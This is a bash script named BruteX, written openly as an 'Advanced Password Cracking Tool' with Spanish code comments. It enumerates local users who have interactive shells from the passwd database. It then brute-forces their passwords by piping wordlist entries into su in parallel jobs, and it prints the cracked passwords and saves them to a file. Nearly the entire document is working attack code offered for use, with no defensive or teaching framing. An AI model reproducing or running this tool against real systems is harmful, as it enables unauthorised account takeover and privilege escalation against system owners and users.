#!/bin/bash
#
# ═════════════════════════════════════════════════════════════════════════
#   BruteX — Advanced Password Cracking Tool
#   by MatthyGD
# ═════════════════════════════════════════════════════════════════════════

# ─── Paleta de colores (truecolor + fallback ANSI) ────────────────────────
if [[ "${COLORTERM:-}" == "truecolor" || "${COLORTERM:-}" == "24bit" ]]; then
  C_PRIMARY=$'\033[38;2;0;230;200m'
  C_ACCENT=$'\033[38;2;255;90;180m'
  C_OK=$'\033[38;2;100;240;130m'
  C_WARN=$'\033[38;2;255;200;80m'
  C_ERR=$'\033[38;2;255;90;110m'
  C_DIM=$'\033[38;2;130;130;150m'
  C_TEXT=$'\033[38;2;225;225;235m'
  C_HL=$'\033[38;2;120;180;255m'
else
  C_PRIMARY=$'\033[1;36m'
  C_ACCENT=$'\033[1;35m'
  C_OK=$'\033[1;32m'
  C_WARN=$'\033[1;33m'
  C_ERR=$'\033[1;31m'
  C_DIM=$'\033[2;37m'
  C_TEXT=$'\033[0;37m'
  C_HL=$'\033[1;34m'
fi
RESET=$'\033[0m'
BOLD=$'\033[1m'

RED=$C_ERR; GREEN=$C_OK; YELLOW=$C_WARN; BLUE=$C_HL
PURPLE=$C_ACCENT; CYAN=$C_PRIMARY; GRAY=$C_DIM; NC=$RESET

S_OK="✔"
S_ERR="✖"
S_WARN="⚠"
S_ARROW="➜"
S_BULLET="◆"
S_DOT="·"

# ─── UI helpers ───────────────────────────────────────────────────────────
hr() {
  local cols=("38;2;0;230;200" "38;2;80;200;240" "38;2;160;160;240" "38;2;220;120;220" "38;2;255;90;180")
  printf "  "
  local c
  for c in "${cols[@]}"; do
    printf "\033[%sm%s" "$c" "$(printf '━%.0s' $(seq 1 14))"
  done
  printf "%s\n" "$RESET"
}

section_header() {
  local title="$1"
  echo
  hr
  printf "  %s%s%s   %s%s%s\n" "$C_ACCENT" "$S_BULLET" "$RESET" "$BOLD$C_PRIMARY" "$title" "$RESET"
  hr
  echo
}

print_info()  { echo -e "  ${C_HL}${S_ARROW}${RESET} $1"; }
print_ok()    { echo -e "  ${C_OK}${S_OK}${RESET} $1"; }
print_warn()  { echo -e "  ${C_WARN}${S_WARN}${RESET} $1"; }
print_err()   { echo -e "  ${C_ERR}${S_ERR}${RESET} $1"; }
print_step()  { echo -e "  ${C_ACCENT}${S_BULLET}${RESET} $1"; }
print_sep()   { echo -e "  ${C_DIM}$(printf '─%.0s' {1..56})${RESET}"; }

# ─── Estado global ────────────────────────────────────────────────────────
DICTIONARY=""
WORK_DIR=""
STOP_FLAG=""
ATTACK_START=0
STOP=0
declare -a interactive_users=()

# ─── Cleanup ──────────────────────────────────────────────────────────────
cleanup() {
  [ -n "$WORK_DIR" ] && rm -rf "$WORK_DIR"
  tput cnorm 2>/dev/null
}

# ─── Manejador de interrupción ────────────────────────────────────────────
ctrl_c() {
  echo ""
  print_warn "Interrupt received — stopping attack..."
  STOP=1
  [ -n "$STOP_FLAG" ] && touch "$STOP_FLAG"
  wait 2>/dev/null
  tput cnorm 2>/dev/null
  [ -n "$WORK_DIR" ] && show_results
  cleanup
  exit 1
}

trap ctrl_c INT

# ─── Banner ───────────────────────────────────────────────────────────────
show_banner() {
  clear
  local lines=(
    " ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██╗  ██╗"
    " ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝╚██╗██╔╝"
    " ██████╔╝██████╔╝██║   ██║   ██║   █████╗   ╚███╔╝ "
    " ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝   ██╔██╗ "
    " ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██╔╝ ██╗"
    " ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝"
  )
  local colors=(
    $'\033[38;2;0;230;220m'
    $'\033[38;2;60;200;240m'
    $'\033[38;2;130;170;245m'
    $'\033[38;2;190;130;235m'
    $'\033[38;2;235;100;210m'
    $'\033[38;2;255;90;170m'
  )
  echo
  for i in 0 1 2 3 4 5; do
    printf "  %s%s%s\n" "${colors[$i]}" "${lines[$i]}" "$RESET"
  done
  echo
  printf "  %s%s%s  %sAdvanced Password Cracking Tool%s   %s%s%s   %sby %s%sMatthyGD%s\n" \
    "$C_ACCENT" "$S_BULLET" "$RESET" \
    "$BOLD$C_TEXT" "$RESET" \
    "$C_DIM" "$S_DOT" "$RESET" \
    "$C_DIM" "$RESET" "$C_ACCENT$BOLD" "$RESET"
  echo
}

# ─── Help ─────────────────────────────────────────────────────────────────
show_help() {
  section_header "USAGE"
  print_info "${BOLD}$0${RESET} ${C_HL}-w <wordlist>${RESET}"
  echo ""
  print_step "${C_HL}-w${RESET}   Wordlist file to use"
  print_step "${C_HL}-h${RESET}   Show this help message"
  echo ""
  hr
  echo ""
}

# ─── Detección de usuarios ────────────────────────────────────────────────
detect_users() {
  section_header "USER DETECTION"
  print_info "Scanning for users with interactive shells..."

  mapfile -t interactive_users < <(
    getent passwd | awk -F: '$7 ~ /(\/bash|\/sh|\/zsh)$/ {print $1}'
  )

  if [ "${#interactive_users[@]}" -eq 0 ]; then
    print_warn "Primary scan failed — trying UID-based fallback..."
    mapfile -t interactive_users < <(
      getent passwd | awk -F: '$3 >= 1000 && $3 <= 60000 {print $1}' | grep -v '^nobody$'
    )
  fi

  if [ "${#interactive_users[@]}" -eq 0 ]; then
    print_err "No interactive users found."
    exit 1
  fi

  echo ""
  for user in "${interactive_users[@]}"; do
    local shell home
    shell=$(getent passwd "$user" | cut -d: -f7)
    home=$(getent passwd  "$user" | cut -d: -f6)
    print_step "${BOLD}${C_HL}${user}${RESET}"
    echo -e "     ${C_DIM}${S_ARROW}${RESET} ${C_DIM}Shell:${RESET} ${C_TEXT}${shell}${RESET}"
    echo -e "     ${C_DIM}${S_ARROW}${RESET} ${C_DIM}Home:${RESET}  ${C_TEXT}${home}${RESET}"
  done
  echo ""
  hr
  echo ""
}

# ─── Resumen de configuración ─────────────────────────────────────────────
show_info() {
  section_header "ATTACK CONFIGURATION"
  print_info "Wordlist   ${C_DIM}→${RESET} ${C_HL}${DICTIONARY}${RESET}"
  print_info "Lines      ${C_DIM}→${RESET} ${C_HL}$(wc -l < "$DICTIONARY")${RESET}"
  print_info "Users      ${C_DIM}→${RESET} ${C_HL}${#interactive_users[@]}${RESET}"
  echo ""
  hr
  echo ""
}

# ─── Tester de credencial individual ─────────────────────────────────────
# Se ejecuta como subshell via &; comunica resultado escribiendo en WORK_DIR.
# FIX: arrays asociativos no son exportables en bash → usamos archivos.
_test_user() {
  local user="$1"
  local password="$2"

  [ -f "${WORK_DIR}/stop"          ] && return
  [ -f "${WORK_DIR}/found_${user}" ] && return

  if echo "$password" | timeout 0.1 su "$user" -c 'exit' 2>/dev/null; then
    echo "$password" > "${WORK_DIR}/found_${user}"
  fi
}

# ─── Bucle principal de ataque ────────────────────────────────────────────
test_credentials() {
  local wordlist="$1"
  local total_lines
  total_lines=$(wc -l < "$wordlist")
  local line=0
  local -A reported=()
  # Jobs concurrentes: nproc * usuarios → múltiples passwords en vuelo a la vez
  local max_jobs=$(( $(nproc) * ${#interactive_users[@]} ))
  [ "$max_jobs" -lt 4 ] && max_jobs=4

  # FIX: WORK_DIR y ATTACK_START son globales para que show_results los vea
  WORK_DIR=$(mktemp -d)
  STOP_FLAG="${WORK_DIR}/stop"
  ATTACK_START=$(date +%s)

  section_header "BRUTE FORCE ATTACK"
  print_info "Target users: ${C_HL}${#interactive_users[@]}${RESET}  |  Wordlist: ${C_HL}${total_lines}${RESET} passwords  |  Jobs: ${C_HL}${max_jobs}${RESET}"
  echo ""

  tput civis 2>/dev/null

  while IFS= read -r password && [ ! -f "$STOP_FLAG" ]; do
    ((line++))

    # Barra de progreso
    local elapsed=$(( $(date +%s) - ATTACK_START ))
    local percentage=$(( line * 100 / total_lines ))
    local eta_str="--:--:--"
    if [ "$line" -gt 1 ] && [ "$elapsed" -gt 0 ]; then
      local eta=$(( elapsed * (total_lines - line) / line ))
      eta_str=$(printf "%02d:%02d:%02d" $((eta/3600)) $((eta%3600/60)) $((eta%60)))
    fi
    echo -ne "\r  ${C_HL}${S_ARROW}${RESET} ${C_DIM}[${percentage}%]${RESET} ${C_PRIMARY}${line}/${total_lines}${RESET} | ETA: ${C_WARN}${eta_str}${RESET} | ${C_DIM}${password:0:32}${RESET}         "

    for user in "${interactive_users[@]}"; do
      [ -f "$WORK_DIR/found_${user}" ] && continue
      # Throttle: esperar slot libre en el pool antes de lanzar el siguiente job
      while [ "$(jobs -rp | wc -l)" -ge "$max_jobs" ]; do sleep 0.005; done
      _test_user "$user" "$password" &
    done
    # Sin wait aquí: el siguiente password se despacha sin esperar al anterior

    # Comprobar resultados sin bloquear (non-blocking)
    for user in "${interactive_users[@]}"; do
      if [ -f "$WORK_DIR/found_${user}" ] && [ -z "${reported[$user]+x}" ]; then
        reported["$user"]=1
        local pw
        pw=$(cat "$WORK_DIR/found_${user}")
        echo ""
        print_ok "${BOLD}${C_HL}${user}${RESET}${C_OK} cracked!${RESET}  Password: ${BOLD}${C_OK}${pw}${RESET}"
        [ "${#reported[@]}" -ge "${#interactive_users[@]}" ] && touch "$STOP_FLAG"
      fi
    done

  done < "$wordlist"

  wait  # drenar jobs restantes del último batch

  # Check final: credenciales encontradas durante el drain
  for user in "${interactive_users[@]}"; do
    if [ -f "$WORK_DIR/found_${user}" ] && [ -z "${reported[$user]+x}" ]; then
      reported["$user"]=1
      local pw
      pw=$(cat "$WORK_DIR/found_${user}")
      echo ""
      print_ok "${BOLD}${C_HL}${user}${RESET}${C_OK} cracked!${RESET}  Password: ${BOLD}${C_OK}${pw}${RESET}"
    fi
  done

  tput cnorm 2>/dev/null
  echo ""
}

# ─── Resumen de resultados ────────────────────────────────────────────────
show_results() {
  section_header "ATTACK SUMMARY"

  local found=0
  local -a cracked=()
  for user in "${interactive_users[@]}"; do
    if [ -f "$WORK_DIR/found_${user}" ]; then
      ((found++))
      local pw
      pw=$(cat "$WORK_DIR/found_${user}")
      cracked+=("${user}:${pw}")
    fi
  done

  # FIX: ATTACK_START es global → funciona desde ctrl_c y desde el flujo normal
  local elapsed=0
  [ "$ATTACK_START" -gt 0 ] && elapsed=$(( $(date +%s) - ATTACK_START ))
  local elapsed_str
  elapsed_str=$(printf "%02d:%02d:%02d" $((elapsed/3600)) $((elapsed%3600/60)) $((elapsed%60)))

  if [ "$found" -gt 0 ]; then
    print_ok "Attack successful — ${C_HL}${found}${RESET} credential(s) cracked."
    echo ""
    local results_file="brutex_$(date +%Y%m%d_%H%M%S).txt"
    for entry in "${cracked[@]}"; do
      local u="${entry%%:*}"
      local p="${entry#*:}"
      print_step "${C_HL}${u}${RESET}  ${C_DIM}→${RESET}  ${C_OK}${p}${RESET}"
      echo "${u}:${p}" >> "$results_file"
    done
    echo ""
    print_info "Saved to ${C_HL}${results_file}${RESET}"
  else
    print_warn "No valid credentials found."
  fi

  local remaining=$(( ${#interactive_users[@]} - found ))
  [ "$remaining" -gt 0 ] && print_info "${remaining} user(s) not cracked."

  echo ""
  print_info "Total time: ${C_HL}${elapsed_str}${RESET}"
  echo ""
  hr
  echo ""
}

# ─── Entry point ──────────────────────────────────────────────────────────
while getopts ":w:h" opt; do
  case $opt in
    w) DICTIONARY="$OPTARG" ;;
    h) show_banner; show_help; exit 0 ;;
    *) show_banner; print_err "Invalid option: -$OPTARG"; echo ""; show_help; exit 1 ;;
  esac
done

if [ -z "$DICTIONARY" ]; then
  show_banner
  show_help
  exit 0
fi

if [ ! -f "$DICTIONARY" ]; then
  show_banner
  print_err "Wordlist not found: ${C_HL}${DICTIONARY}${RESET}"
  exit 1
fi

show_banner
detect_users
show_info
test_credentials "$DICTIONARY"
show_results
cleanup
